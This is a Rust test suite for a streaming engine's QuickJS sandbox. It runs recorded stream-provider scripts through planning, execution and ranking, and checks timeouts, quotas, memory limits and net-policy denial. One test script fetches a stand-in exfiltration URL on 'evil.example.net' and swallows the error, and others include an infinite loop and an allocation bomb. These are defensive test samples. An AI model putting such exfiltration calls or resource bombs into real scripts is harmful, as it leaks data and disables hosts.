//! The end-to-end exec proof: a RECORDED Nuvio-style provider script + recorded HTTP bodies driven
//! through the WHOLE seam. The kernel PLANS the execution (`stream_load` over the engine's JSON query
//! surface -> `execRequests`), the host EXECUTES it (the rquickjs [`QuickJsExec`] sandbox over a
//! recorded [`RecordedNet`] transport, no network), and the kernel SETTLES the outcome
//! (`settle_streams` -> ranked protocol streams + breaker snapshot). Ranking, dedup, and the circuit
//! breakers are the untouched existing machinery; the JS provider rides them exactly like an HTTP addon.
//!
//! Also proven here: a provider that throws is `Threw` and TRIPS ITS BREAKER (three rounds -> open ->
//! the next kernel plan skips it); an over-budget provider is `Timeout`; a net-policy violation is
//! `Denied` (sticky, even when the script swallows the error); an allocation bomb is `Oom`; and the
//! same inputs settle BYTE-IDENTICALLY across two full runs.
//!
//! This whole suite drives the bundled QuickJS executor, so it is gated on the `quickjs` feature (on
//! by default). Under `--no-default-features` the file compiles to nothing, matching an Apple
//! (JavaScriptCore) host that links no rquickjs.
#![cfg(feature = "quickjs")]

use std::collections::BTreeMap;
use std::sync::Arc;

use serde_json::{json, Value};
use vortx_engine::{init_runtime, resolve_json, Engine};
use vortx_exec::{execute_exec_plan, ExecOutcome, ExecRequest, NetPolicy};
use vortx_host_native::{QuickJsExec, RecordedNet};

/// A faithful minimal Nuvio-style provider: `getStreams(id, type)` fetches the hoster API (headers
/// included, as real providers do) and maps its sources onto Nuvio stream objects.
const VIDFAST_PROVIDER: &str = r#"
async function getStreams(id, type) {
    const res = await fetch("https://api.vidfast.example/streams?id=" + id + "&type=" + type, {
        headers: { "User-Agent": "Nuvio/1.0", "Referer": "https://vidfast.example/" }
    });
    if (!res.ok) throw new Error("upstream status " + res.status);
    const data = await res.json();
    return data.sources.map(function (s) {
        return {
            name: "VidFast " + s.quality,
            title: data.title + " " + s.quality + " WEB-DL",
            url: s.url,
            quality: s.quality,
            size: s.size,
            headers: { "Referer": "https://vidfast.example/" }
        };
    });
}
"#;

/// The recorded hoster API body (qualities deliberately scrambled so the ranked order PROVES the
/// kernel reranked them: 720p first in, 2160p first out).
const VIDFAST_API_URL: &str = "https://api.vidfast.example/streams?id=tt0468569&type=movie";
const VIDFAST_API_BODY: &str = r#"{"title":"The Dark Knight","sources":[
    {"quality":"720p","url":"https://cdn.vidfast.example/tt0468569/720.mp4","size":"1.1 GB"},
    {"quality":"2160p","url":"https://cdn.vidfast.example/tt0468569/2160.mp4","size":"8.2 GB"},
    {"quality":"1080p","url":"https://cdn.vidfast.example/tt0468569/1080.mp4","size":"2.3 GB"}
]}"#;

fn recorded_exec() -> (QuickJsExec, String) {
    let net = RecordedNet::new().with_body(VIDFAST_API_URL, VIDFAST_API_BODY);
    let mut exec = QuickJsExec::new(Arc::new(net));
    let hash = exec.register_script(VIDFAST_PROVIDER);
    (exec, hash)
}

fn registry(hash: &str) -> Value {
    json!([{
        "id": "vidfast",
        "url": "https://repo.example/nuvio",
        "kind": "nuvio_provider",
        "capabilities": ["stream"],
        "types": ["movie"],
        "scriptHash": hash,
        "permissions": ["net:api.vidfast.example"]
    }])
}

fn query(engine: &Engine, request: &Value, expect_kind: &str) -> Value {
    let out: Value = serde_json::from_str(&resolve_json(engine, &request.to_string()))
        .expect("engine returns JSON");
    assert_eq!(out["kind"], expect_kind, "unexpected response: {out}");
    out
}

/// One full kernel-plan -> host-execute -> kernel-settle round; returns the raw settle response text.
fn full_round(engine: &Engine, exec: &QuickJsExec, hash: &str, circuit: &Value) -> String {
    let plan_out = query(
        engine,
        &json!({
            "kind": "stream_load",
            "req": { "kind": "stream", "type": "movie", "id": "tt0468569" },
            "registrySnapshot": registry(hash),
            "circuitSnapshot": circuit,
            "now": 1000,
            "budgetMs": 5000
        }),
        "stream_load_plan",
    );
    let exec_plan: Vec<ExecRequest> =
        serde_json::from_value(plan_out["execRequests"].clone()).expect("exec plan");
    let outcomes: BTreeMap<String, ExecOutcome> =
        execute_exec_plan(&exec_plan, exec).into_iter().collect();
    resolve_json(
        engine,
        &json!({
            "kind": "settle_streams",
            "plan": plan_out["requests"],
            "outcomes": {},
            "execPlan": exec_plan,
            "execOutcomes": outcomes,
            "circuitSnapshot": circuit,
            "now": 1000
        })
        .to_string(),
    )
}

#[test]
fn nuvio_provider_runs_through_the_engine_into_ranked_streams() {
    let engine = init_runtime("owner", "Owner");
    let (exec, hash) = recorded_exec();

    // PLAN: the kernel routes the provider and stamps script/args/policy/budget.
    let plan_out = query(
        &engine,
        &json!({
            "kind": "stream_load",
            "req": { "kind": "stream", "type": "movie", "id": "tt0468569" },
            "registrySnapshot": registry(&hash),
            "circuitSnapshot": {},
            "now": 1000,
            "budgetMs": 5000
        }),
        "stream_load_plan",
    );
    assert!(plan_out["requests"].as_array().unwrap().is_empty(), "no HTTP half for a pure JS registry");
    let exec_plan: Vec<ExecRequest> =
        serde_json::from_value(plan_out["execRequests"].clone()).expect("exec plan");
    assert_eq!(exec_plan.len(), 1);
    assert_eq!(exec_plan[0].script_hash, hash);
    assert_eq!(exec_plan[0].args_json, r#"["tt0468569","movie"]"#);
    assert_eq!(exec_plan[0].net_policy.host_allowlist, vec!["api.vidfast.example"]);

    // EXECUTE (host): the sandbox runs the provider over the recorded transport.
    let (outcome, trace) = exec.exec_traced(&exec_plan[0]);
    let ExecOutcome::Ok { json: streams_json } = &outcome else {
        panic!("expected Ok, got {outcome:?}");
    };
    // The provider's raw return carries the hoster headers every stream needs.
    let raw: Value = serde_json::from_str(streams_json).unwrap();
    assert_eq!(raw.as_array().unwrap().len(), 3);
    assert_eq!(raw[0]["headers"]["Referer"], "https://vidfast.example/");
    // The net audit trail recorded exactly the one allowed request.
    assert_eq!(trace.requests.len(), 1);
    assert_eq!(trace.requests[0].url, VIDFAST_API_URL);
    assert_eq!(trace.requests[0].status, 200);
    assert_eq!(trace.total_bytes, VIDFAST_API_BODY.len() as u64);

    // SETTLE (kernel): the outcome routes through the adapter into the ranked player order.
    let settle_out = query(
        &engine,
        &json!({
            "kind": "settle_streams",
            "plan": [],
            "outcomes": {},
            "execPlan": exec_plan,
            "execOutcomes": { "vidfast": outcome },
            "circuitSnapshot": {},
            "now": 1000
        }),
        "settled_streams",
    );
    let ranked = settle_out["ranked"].as_array().unwrap();
    assert_eq!(ranked.len(), 3);
    // Recorded order was 720p, 2160p, 1080p -> the kernel REranked: 2160p (raw 1), 1080p (raw 2), 720p (raw 0).
    assert_eq!(ranked[0]["raw_index"], 1);
    assert_eq!(ranked[0]["tier"], "uhd");
    assert_eq!(ranked[1]["raw_index"], 2);
    assert_eq!(ranked[2]["raw_index"], 0);
    let scores: Vec<i64> = ranked.iter().map(|r| r["score"].as_i64().unwrap()).collect();
    assert!(scores[0] > scores[1] && scores[1] > scores[2], "scores strictly ordered: {scores:?}");
    // The provider settled as a healthy source: breaker reset, exactly like a good HTTP addon.
    assert_eq!(settle_out["circuitSnapshot"]["vidfast"]["consecutive_failures"], 0);
    assert_eq!(settle_out["circuitSnapshot"]["vidfast"]["state"], "closed");
}

#[test]
fn the_full_round_is_byte_deterministic() {
    // Same recorded script + bodies + clock -> byte-identical settle documents across two full
    // plan -> execute -> settle rounds (fresh sandbox world per exec, so nothing can bleed).
    let engine = init_runtime("owner", "Owner");
    let (exec, hash) = recorded_exec();
    let a = full_round(&engine, &exec, &hash, &json!({}));
    let b = full_round(&engine, &exec, &hash, &json!({}));
    assert!(a.contains("\"ranked\""));
    assert_eq!(a.as_bytes(), b.as_bytes());
}

#[test]
fn a_throwing_provider_is_threw_and_trips_its_breaker_like_a_dead_addon() {
    let engine = init_runtime("owner", "Owner");
    let net = RecordedNet::new();
    let mut exec = QuickJsExec::new(Arc::new(net));
    let hash = exec.register_script(
        r#"async function getStreams() { throw new Error("hoster markup changed"); }"#,
    );

    // Three plan -> execute -> settle rounds: each Threw feeds the breaker exactly like an HTTP
    // failure; at the default threshold (3) the circuit opens.
    let mut circuit = json!({});
    for round in 0..3 {
        let plan_out = query(
            &engine,
            &json!({
                "kind": "stream_load",
                "req": { "kind": "stream", "type": "movie", "id": "tt0468569" },
                "registrySnapshot": registry(&hash),
                "circuitSnapshot": circuit,
                "now": 1000,
                "budgetMs": 5000
            }),
            "stream_load_plan",
        );
        let exec_plan: Vec<ExecRequest> =
            serde_json::from_value(plan_out["execRequests"].clone()).expect("planned");
        assert_eq!(exec_plan.len(), 1, "round {round} still planned");
        let outcome = exec.exec_traced(&exec_plan[0]).0;
        assert!(
            matches!(outcome, ExecOutcome::Threw { ref message } if message.contains("hoster markup changed")),
            "round {round}: {outcome:?}"
        );
        let settle_out = query(
            &engine,
            &json!({
                "kind": "settle_streams",
                "plan": [],
                "outcomes": {},
                "execPlan": exec_plan,
                "execOutcomes": { "vidfast": outcome },
                "circuitSnapshot": circuit,
                "now": 1000
            }),
            "settled_streams",
        );
        assert_eq!(settle_out["ranked"].as_array().unwrap().len(), 0);
        circuit = settle_out["circuitSnapshot"].clone();
    }
    assert_eq!(circuit["vidfast"]["consecutive_failures"], 3);
    assert_eq!(circuit["vidfast"]["state"], "open");

    // The tripped provider is NOT planned while cooling: no crash, no exec, just skipped.
    let cooled = resolve_json(
        &engine,
        &json!({
            "kind": "stream_load",
            "req": { "kind": "stream", "type": "movie", "id": "tt0468569" },
            "registrySnapshot": registry(&hash),
            "circuitSnapshot": circuit,
            "now": 1100,
            "budgetMs": 5000
        })
        .to_string(),
    );
    assert!(!cooled.contains("execRequests"), "open breaker was planned anyway: {cooled}");
}

#[test]
fn an_over_budget_provider_times_out() {
    let mut exec = QuickJsExec::new(Arc::new(RecordedNet::new()));
    let hash = exec.register_script(r#"function getStreams() { for (;;) {} }"#);
    let req = ExecRequest {
        provider_id: "spin".into(),
        script_hash: hash,
        entrypoint: "getStreams".into(),
        args_json: r#"["tt1","movie"]"#.into(),
        budget_ms: 50,
        net_policy: NetPolicy::default(),
    };
    assert_eq!(exec.exec_traced(&req).0, ExecOutcome::Timeout);
}

#[test]
fn a_net_policy_violation_is_denied_even_if_the_script_swallows_it() {
    // The provider probes a host outside its manifest grant, CATCHES the error, and returns [] as if
    // nothing happened. The verdict is still Denied: policy outranks the script's error handling.
    let net = RecordedNet::new().with_body("https://evil.example.net/exfil", "{}");
    let mut exec = QuickJsExec::new(Arc::new(net));
    let hash = exec.register_script(
        r#"async function getStreams() {
            try { await fetch("https://evil.example.net/exfil"); } catch (e) {}
            return [];
        }"#,
    );
    let req = ExecRequest {
        provider_id: "sneaky".into(),
        script_hash: hash,
        entrypoint: "getStreams".into(),
        args_json: r#"["tt1","movie"]"#.into(),
        budget_ms: 5000,
        net_policy: NetPolicy::from_permissions(&["net:api.vidfast.example".to_string()]),
    };
    let (outcome, trace) = exec.exec_traced(&req);
    assert_eq!(
        outcome,
        ExecOutcome::Denied { capability: "net:evil.example.net".into() }
    );
    // The denied request never reached the transport's audit trail.
    assert!(trace.requests.is_empty());
}

#[test]
fn exceeding_the_request_quota_is_denied() {
    let net = RecordedNet::new()
        .with_body("https://api.ok.example/1", "{}")
        .with_body("https://api.ok.example/2", "{}")
        .with_body("https://api.ok.example/3", "{}");
    let mut exec = QuickJsExec::new(Arc::new(net));
    let hash = exec.register_script(
        r#"async function getStreams() {
            await fetch("https://api.ok.example/1");
            await fetch("https://api.ok.example/2");
            await fetch("https://api.ok.example/3");
            return [];
        }"#,
    );
    let req = ExecRequest {
        provider_id: "chatty".into(),
        script_hash: hash,
        entrypoint: "getStreams".into(),
        args_json: r#"["tt1","movie"]"#.into(),
        budget_ms: 5000,
        net_policy: NetPolicy {
            host_allowlist: vec!["api.ok.example".into()],
            max_requests: 2,
            max_total_bytes: 8 * 1024 * 1024,
        },
    };
    let (outcome, trace) = exec.exec_traced(&req);
    assert_eq!(outcome, ExecOutcome::Denied { capability: "net:max-requests".into() });
    assert_eq!(trace.requests.len(), 2, "only the granted requests ran");
}

#[test]
fn an_allocation_bomb_is_oom() {
    let mut exec = QuickJsExec::new(Arc::new(RecordedNet::new())).with_memory_limit(2 * 1024 * 1024);
    let hash = exec.register_script(
        r#"function getStreams() {
            var a = [];
            for (var i = 0; i < 1e9; i++) { a.push("xxxxxxxxxxxxxxxx" + i); }
            return a;
        }"#,
    );
    let req = ExecRequest {
        provider_id: "bomb".into(),
        script_hash: hash,
        entrypoint: "getStreams".into(),
        args_json: r#"["tt1","movie"]"#.into(),
        budget_ms: 10_000,
        net_policy: NetPolicy::default(),
    };
    assert_eq!(exec.exec_traced(&req).0, ExecOutcome::Oom);
}

#[test]
fn a_module_exports_provider_and_series_args_work() {
    // Providers that export CommonJS-style still resolve; a series id carries season/episode.
    let net = RecordedNet::new().with_body(
        "https://api.vidfast.example/streams?id=tt0944947&type=series&s=3&e=9",
        r#"{"title":"GoT","sources":[{"quality":"1080p","url":"https://cdn.vidfast.example/got/1080.mp4","size":"2 GB"}]}"#,
    );
    let mut exec = QuickJsExec::new(Arc::new(net));
    let hash = exec.register_script(
        r#"async function getStreams(id, type, season, episode) {
            const res = await fetch("https://api.vidfast.example/streams?id=" + id + "&type=" + type + "&s=" + season + "&e=" + episode);
            const data = await res.json();
            return data.sources.map(function (s) { return { name: "VidFast " + s.quality, url: s.url, quality: s.quality }; });
        }
        module.exports = { getStreams: getStreams };
        "#,
    );
    let req = ExecRequest {
        provider_id: "vidfast".into(),
        script_hash: hash,
        entrypoint: "getStreams".into(),
        args_json: r#"["tt0944947","series",3,9]"#.into(),
        budget_ms: 5000,
        net_policy: NetPolicy::from_permissions(&["net:api.vidfast.example".to_string()]),
    };
    let (outcome, _) = exec.exec_traced(&req);
    let ExecOutcome::Ok { json } = outcome else {
        panic!("expected Ok, got {outcome:?}");
    };
    let raw: Value = serde_json::from_str(&json).unwrap();
    assert_eq!(raw[0]["url"], "https://cdn.vidfast.example/got/1080.mp4");
}
